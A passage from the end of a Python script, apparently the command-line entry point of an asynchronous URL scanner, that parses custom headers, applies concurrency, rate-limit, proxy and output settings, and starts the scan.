            # Expect "Name: value"
            name, sep, value = hdr.partition(':')
            if not sep:
                # Skip invalid header without ':'
                continue
            scanner.static_headers[name.strip()] = value.strip()
    
    # Apply CLI overrides
    scanner.config.scanner['concurrency'] = concurrency
    scanner.config.rate_limiting['requests_per_second'] = rate_limit
    scanner.config.scanner['proxy'] = proxy
    scanner.config.scanner['proxy_auth'] = proxy_auth
    scanner.config.output['format'] = output_format
    scanner.quiet_mode = quiet

    await scanner.run(urls=[url] if url else None, url_file=url_file)

if __name__ == "__main__":
    asyncio.run(main())
